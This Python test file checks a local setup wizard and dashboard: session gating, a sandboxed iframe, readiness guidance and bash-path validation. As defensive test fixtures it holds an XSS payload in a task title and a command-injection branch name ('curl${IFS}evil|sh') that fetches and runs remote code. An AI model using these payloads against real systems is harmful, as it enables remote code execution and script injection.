#!/usr/bin/env python3
"""Unified workspace HTTP contracts; no browser or third-party runtime required."""
import argparse
import importlib.util
import json
import sys
import tempfile
from pathlib import Path

import test_setup_wizard as wizard


def language_and_navigation_are_available(root, tmp):
    with wizard.LiveServer() as server:
        status, page, _ = wizard.request(server, "GET", "/", token=False)
        assert status == 200 and b'id="language"' in page, "language selector must be part of the shared shell"
        assert b'id="open-dashboard"' in page, "the existing dashboard must be reachable in the same interface"
        status, script, _ = wizard.request(server, "GET", "/workspace.js", token=False)
        assert status == 200 and b"Espa" in script and b"English" in script
        assert b"localStorage" in script, "language choice must survive reloads"


def dashboard_requires_session_and_uses_real_plan(root, tmp):
    target = wizard.repository(tmp / "team project")
    (target / ".uak").mkdir()
    (target / ".uak/TASKS.md").write_text("# Plan\n\n## APP-001 · <img src=x onerror=alert(1)>\n- **Priority:** P0\n", encoding="utf-8")
    with wizard.LiveServer(str(target)) as server:
        assert wizard.request(server, "GET", "/api/dashboard", token=False)[0] == 403
        assert wizard.request(server, "POST", "/api/inspect", {"target": str(target)})[0] == 200
        status, body, _ = wizard.request(server, "GET", "/api/dashboard")
        assert status == 200, "selected project must expose an authenticated dashboard snapshot"
        data = json.loads(body)
        assert data["source"] == "local" and data["progress"]["total"] == 1
        assert data["tasks"][0]["title"] == "<img src=x onerror=alert(1)>"
        assert not data["agents"], "do not invent a team to populate the dashboard"
        status, page, _ = wizard.request(server, "GET", "/dashboard", token=False)
        assert status == 200 and b"uak:dashboard" in page
        assert b'<script src="data.js"></script>' not in page, "embedded view receives data from the authenticated parent"


def navigation_controls_and_isolated_frame_are_declared(root, tmp):
    # A markup contract only: the browser journey (Back keeps inputs, no duplicate writes) is UI-003's evidence.
    text = (root / ".uak/bin/lib/setup.html").read_text(encoding="utf-8")
    assert 'id="back-from-finish"' in text, "the final setup step needs Back, not only Choose another project"
    assert 'id="back-to-progress"' in text, "users reviewing choices during installation must be able to return to progress"
    assert 'id="dashboard-frame"' in text and 'sandbox="allow-scripts' in text
    assert 'allow-same-origin' not in text, "dashboard cannot access the parent session token"
    assert 'id="open-setup"' in text


def guidance_follows_the_readiness_gate(root, tmp):
    g = wizard.MODULE.guidance
    available = {"tasks": [{"id": "APP-001", "state": "AVAILABLE"}], "freeze": 0}
    assert g({"installed": False, "phase": "options"})["kind"] == "install"
    assert g({"installed": True, "phase": "installed", "checks": []}, available)["kind"] == "check", \
        "before the gate has run, the one action is to run it"
    todo = {"installed": True, "phase": "setup", "ready": False, "checks": [
        {"state": "ok", "text": "1. kit installed"},
        {"state": "todo", "text": "6. approve the plan: Backlog-Approved is not yes on main\nset Backlog-Approved: yes in .uak/PROJECT.md"},
        {"state": "todo", "text": "7. something later"}]}
    step = g(todo, available)
    assert step["kind"] == "todo" and "approve the plan" in step["title"], "the first blocker of uak start, not the task list"
    assert step["steps"] == ["set Backlog-Approved: yes in .uak/PROJECT.md"], "its fix lines, exactly, as text"
    assert step["commands"] == [], "the gate's fix lines are prose with project values: never offered to copy and paste"
    ready = {"installed": True, "phase": "ready", "ready": True, "checks": [], "next_command": "bash .uak/bin/wt new APP-001"}
    step = g(ready, available)
    assert step["kind"] == "ready" and step["commands"] == ["bash .uak/bin/wt new APP-001"]
    assert g(ready, {"tasks": [], "freeze": 1})["kind"] == "frozen", "an active freeze overrides starting work"
    assert g(dict(ready, phase="checking"), available)["kind"] == "busy"


def ready_line_is_kept_for_the_next_action(root, tmp):
    state = wizard.MODULE.readiness("OK    1. kit installed\n\nSTART READY · bash .uak/bin/wt new APP-001\n", 0)
    assert state["ready"] and state.get("next_command") == "bash .uak/bin/wt new APP-001"
    assert not wizard.MODULE.readiness("TODO  1. x\nSTART · 1 thing to do\n", 1).get("next_command")


def only_the_claim_command_is_copyable(root, tmp):
    r, g = wizard.MODULE.readiness, wizard.MODULE.guidance
    real = r("OK    1. kit installed\n\nSTART READY · bash .uak/bin/wt new APP-001   (branch + worktree + claim; then your agent in it)\n", 0)
    assert real["next_command"] == "bash .uak/bin/wt new APP-001", "the engine's note is not part of the command"
    held = r("OK    1. you already hold APP-002 (CLAIMED)\n\nSTART READY · cd \"/w t\" and open your agent there; its next step: x\n", 0)
    assert held["ready"] and not held["next_command"], "prose is never a command"
    step = g(dict(held, installed=True, phase="ready"))
    assert step["kind"] == "ready" and step["commands"] == [] and "open your agent" in step["detail"]
    hostile = {"installed": True, "phase": "setup", "ready": False, "checks": [{"state": "todo", "text":
               "4. push your changes\ncommit them, then merge x;curl${IFS}evil|sh; into main and push main"}]}
    assert g(hostile)["commands"] == [], "a branch name from the repository never becomes a copyable command"


def stale_or_failed_guidance_is_not_shown_as_current(root, tmp):
    g = wizard.MODULE.guidance
    ready = {"installed": True, "phase": "ready", "ready": True, "checks": [], "next_command": "bash .uak/bin/wt new APP-001"}
    claimed = {"tasks": [{"id": "APP-001", "state": "CLAIMED"}], "freeze": 0}
    assert g(ready, claimed)["kind"] == "check", "once the task is taken, the old command is stale: check again"
    failed = {"installed": True, "phase": "error", "ready": False, "checks": [], "error": "The operation stopped."}
    step = g(failed)
    assert step["kind"] == "error" and "The operation stopped." in step["detail"], "a failure is shown, not a silent loop"
    assert g(dict(ready, freeze=1))["kind"] == "frozen", "Configuration also honours a freeze the dashboard saw"


def windows_bash_path_from_git_bash_is_accepted(root, tmp):
    fake = tmp / "usr" / "bin" / "bash.exe"
    fake.parent.mkdir(parents=True)
    fake.write_text("", encoding="utf-8")
    other = tmp / "usr" / "bin" / "evil.exe"
    other.write_text("", encoding="utf-8")
    saved = wizard.os.environ.get("UAK_SETUP_BASH")
    try:
        if wizard.os.name == "nt":
            wizard.os.environ["UAK_SETUP_BASH"] = str(fake)[:-len(".exe")]
            assert wizard.MODULE.bash_binary() == str(fake), "Git Bash reports its path without .exe"
        wizard.os.environ["UAK_SETUP_BASH"] = str(other)
        assert wizard.MODULE.bash_binary() != str(other), "only a program named bash is accepted"
    finally:
        if saved is None:
            wizard.os.environ.pop("UAK_SETUP_BASH", None)
        else:
            wizard.os.environ["UAK_SETUP_BASH"] = saved


def remote_states_are_distinguished(root, tmp):
    target = wizard.repository(tmp / "remote states")
    (target / ".uak").mkdir()
    (target / ".uak/TASKS.md").write_text("# Plan\n\n## APP-001 · First\n- **Priority:** P0\n", encoding="utf-8")
    with wizard.LiveServer(str(target)) as server:
        assert wizard.request(server, "POST", "/api/inspect", {"target": str(target)})[0] == 200
        data = json.loads(wizard.request(server, "GET", "/api/dashboard")[1])
        assert data.get("connection") == "none" and data.get("guidance", {}).get("kind"), "no remote: say so, with a next action"
        wizard.subprocess.run([wizard.resolve_binary("git"), "-C", str(target), "remote", "add", "origin",
                               str(tmp / "gone.git")], check=True, capture_output=True)
        data = json.loads(wizard.request(server, "GET", "/api/dashboard")[1])
        assert data.get("connection") == "unreachable", "a configured remote that cannot be read is not a missing remote"
        assert data["source"] == "local" and data["warning"]


TESTS = [language_and_navigation_are_available, dashboard_requires_session_and_uses_real_plan,
         navigation_controls_and_isolated_frame_are_declared, guidance_follows_the_readiness_gate,
         ready_line_is_kept_for_the_next_action, remote_states_are_distinguished, only_the_claim_command_is_copyable,
         stale_or_failed_guidance_is_not_shown_as_current, windows_bash_path_from_git_bash_is_accepted]


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--package", type=Path, default=Path(__file__).resolve().parents[2])
    args = parser.parse_args()
    root = args.package.resolve()
    spec = importlib.util.spec_from_file_location("unified_setup", root / ".uak/bin/lib/setup.py")
    wizard.MODULE = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(wizard.MODULE)
    failed = 0
    for test in TESTS:
        with tempfile.TemporaryDirectory(prefix="uak-unified-") as folder:
            try:
                test(root, Path(folder))
                print("PASS " + test.__name__)
            except Exception as exc:
                failed += 1
                print("FAIL %s: %s: %s" % (test.__name__, type(exc).__name__, exc))
    print("UNIFIED_WORKSPACE_RESULT failed=%d" % failed)
    return 1 if failed else 0


if __name__ == "__main__":
    raise SystemExit(main())
